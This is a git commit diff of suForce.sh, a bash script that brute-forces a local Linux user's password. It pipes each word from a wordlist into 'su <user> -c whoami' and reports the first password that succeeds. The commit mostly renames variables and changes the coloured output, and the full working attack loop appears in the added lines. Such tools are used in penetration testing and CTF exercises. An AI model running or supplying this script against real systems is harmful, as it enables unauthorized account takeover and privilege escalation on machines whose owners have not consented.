f962edc689a1de819f19beb756148173b36c45a5
d4t4s3c <d4t4s3c@protonmail.com>
2022-10-06 10:09:23 +0200

    UPDATE

--- suForce.sh
+++ suForce.sh
@@ -1,107 +1,113 @@
 #!/bin/bash
 
-declare -r White="\e[97m"
-declare -r Red="\e[31m"
-declare -r BlueLight="\e[94m"
-declare -r GreenLight="\e[92m"
-declare -r YellowLight="\e[93m"
-declare -r CyanLight="\e[96m"
-declare -r End="\e[0m"
+declare -r RED="\e[91m"
+declare -r GREEN="\e[92m"
+declare -r YELLOW="\e[93m"
+declare -r BLUE="\e[94m"
+declare -r WHITE="\e[97m"
+declare -r END="\e[0m"
 
-declare -r var1='['
-declare -r var2=']'
-declare -r var3='i'
-declare -r var4='x'
-declare -r var5='>'
-declare -r var6='<'
-declare -r var7='-'
-declare -r var8='+'
-declare -r var9='./suForce.sh'
-declare -r var10='WORDLIST'
-declare -r var11='USER'
-declare -r var12='Example:'
-declare -r var13='Username:'
-declare -r var14='WordList:'
-declare -r var15='Password:'
-declare -r var16='Line:'
-declare -r var17='Error!'
-declare -r var18='Fuck!'
-declare -r var19='it was not possible to decrypt the password'
-declare -r var20='Status:'
-declare -r var21='-=================================-'
-declare -r var22='[+]'
-declare -r var23='[-]'
-declare -r var24='[!]'
-declare -r var25='[*]'
+declare -r VAR1='['
+declare -r VAR2=']'
+declare -r VAR3='i'
+declare -r VAR4='*'
+declare -r VAR5='>'
+declare -r VAR6='<'
+declare -r VAR7='-'
+declare -r VAR8='+'
+declare -r VAR9='./suForce.sh'
+declare -r VAR10='WORDLIST'
+declare -r VAR11='USER'
+declare -r VAR12='Use:'
+declare -r VAR13='Username:'
+declare -r VAR14='Wordlist:'
+declare -r VAR15='Password:'
+declare -r VAR16='Line:'
+declare -r VAR17='Status'
+declare -r VAR18='Fuck!'
+declare -r VAR19='it was not possible to decrypt the password.'
+declare -r VAR20='-=================================-'
+
+declare -r BOX1="$WHITE$VAR1$GREEN$VAR8$WHITE$VAR2$END"
+declare -r BOX2="$WHITE$VAR1$RED$VAR7$WHITE$VAR2$END"
+declare -r BOX3="$WHITE$VAR1$YELLOW$VAR3$WHITE$VAR2$END"
+declare -r BOX4="$WHITE$VAR1$BLUE$VAR4$WHITE$VAR2$END"
+
+trap ctrl_c INT
 
 function banner(){
-    echo -e "$GreenLight            _____                        $End"
-    echo -e "$Red ___ _   _ $GreenLight|  ___|__  _ __ ___ ___   $End"
-    echo -e "$Red/ __| | | |$GreenLight| |_ / _ \| '__/ __/ _ \\ $End"
-    echo -e "$Red\__ \ |_| |$GreenLight|  _| (_) | | | (_|  __/  $End"
-    echo -e "$Red|___/\__,_|$GreenLight|_|  \___/|_|  \___\___|  $End"
-    echo -e "$White$var21$End"
+  echo -e "$GREEN            _____                        $END"
+  echo -e "$RED ___ _   _ $GREEN|  ___|__  _ __ ___ ___   $END"
+  echo -e "$RED/ __| | | |$GREEN| |_ / _ \| '__/ __/ _ \\ $END"
+  echo -e "$RED\__ \ |_| |$GREEN|  _| (_) | | | (_|  __/  $END"
+  echo -e "$RED|___/\__,_|$GREEN|_|  \___/|_|  \___\___|  $END"
+  echo -e "$WHITE$VAR20                                   $END"
 }
 
-function main(){
-    echo ""
-    echo -e "$YellowLight$var25 $Red$var12 $White$var9 -u $Red$var6$White$var11$Red$var5$White -w $Red$var6$White$var10$Red$var5$End"
-    echo ""
+function help(){
+  echo ""
+  echo -e "$BOX3 $RED$VAR12 $WHITE$VAR9 -u $RED$VAR6$WHITE$VAR11$RED$VAR5$WHITE -w $RED$VAR6$WHITE$VAR10$RED$VAR5$END"
+  echo ""
 }
 
 function info(){
-    echo -e "$BlueLight$var25 $White$var13 $CyanLight$username$End"
-    sleep 1
-    echo -e "$BlueLight$var25 $White$var14 $CyanLight$wordlist$End"
-    sleep 1
-    echo -e "$YellowLight$var24 $White$var20$End"
-    sleep 1
+  echo -e "$BOX4 $WHITE$VAR13 $BLUE$USERNAME$END"
+  sleep 1
+  echo -e "$BOX4 $WHITE$VAR14 $BLUE$WORDLIST$END"
+  sleep 1
+  echo -e "$BOX3 $WHITE$VAR17$END"
+  sleep 1
 }
 
-while getopts ":u:w:h:" arg; do
-    case $arg in
-        u) username=$OPTARG; let parameter_counter+=1 ;;
-	w) wordlist=$OPTARG; let parameter_counter+=1 ;;
-	h) help;;
-    esac
+function ctrl_c(){
+  echo ""
+  exit 1
+}
+
+while getopts ":u:w:" arg; do
+  case $arg in
+    u) USERNAME=$OPTARG; let parameter_counter+=1 ;;
+    w) WORDLIST=$OPTARG; let parameter_counter+=1 ;;
+  esac
 done
 
-if [ ! -z $wordlist ]; then
-    banner
-    sleep 1
+if [ ! -z $WORDLIST ]; then
+  banner
+  sleep 1
 else
-    banner
-    main
-    exit 0
+  banner
+  help
+  exit 0
 fi
 
-if [ ! -z $username ]; then
-    info
+if [ ! -z $USERNAME ]; then
+  info
 else
-    main
-    exit 0
+  help
+  exit 0
 fi
 
-lines=$(/usr/bin/wc -l $wordlist)
-regex="([0-9]+).$wordlist"
-[[ $lines =~ $regex ]]
-siz="${BASH_REMATCH[1]}"
+LINES=$(wc -l $WORDLIST)
+REGEX="([0-9]+).$WORDLIST"
+[[ $LINES =~ $REGEX ]]
+SIZ="${BASH_REMATCH[1]}"
 
-while read password; do
-        line=$((line + 1))
-        progress=$((line * 100 / siz))
-        echo -ne "\r$YellowLight    $line/$siz ($progress%) ($password)       $End"
-        echo "$password" | timeout 0.1 bash -c "su $username -c whoami &>/dev/null"
-    if [ $? -eq 0 ]; then
-        f1=$(/usr/bin/cat $wordlist | /usr/bin/grep "^$password$" -n | /usr/bin/cut -d: -f1)
-        echo -e "\n$GreenLight$var22 $Red$var15 $GreenLight$password$Red $var16 $GreenLight$f1"
-        echo -e "$White$var21$End"
-        echo ""
-        sleep 2
-        exit 0
-    fi
-done < $wordlist
-echo -e "\r$Red$var23 $Red$var18 $White$var19$End"
+while read PASSWORD; do
+    LINE=$((LINE + 1))
+    PROGRESS=$((LINE * 100 / SIZ))
+    echo -ne "\r$YELLOW    $LINE/$SIZ/$PROGRESS%/$PASSWORD                              $END"
+    echo "$PASSWORD" | timeout 0.1 bash -c "su $USERNAME -c whoami &>/dev/null"
+  if [ $? -eq 0 ]; then
+    F1=$(/usr/bin/cat $WORDLIST | grep "^$PASSWORD$" -n | cut -d ":" -f 1)
+    echo -e "\n$BOX1 $RED$VAR15 $GREEN$PASSWORD$RED $VAR16 $GREEN$F1"
+    echo -e "$WHITE$VAR20$END"
+    echo ""
+    sleep 2
+    exit 0
+  fi
+done < $WORDLIST
+echo -e "\r$BOX2 $RED$VAR18 $WHITE$VAR19$END"
+echo -e "$WHITE$VAR20$END"
 echo ""
 sleep 2
 exit 0
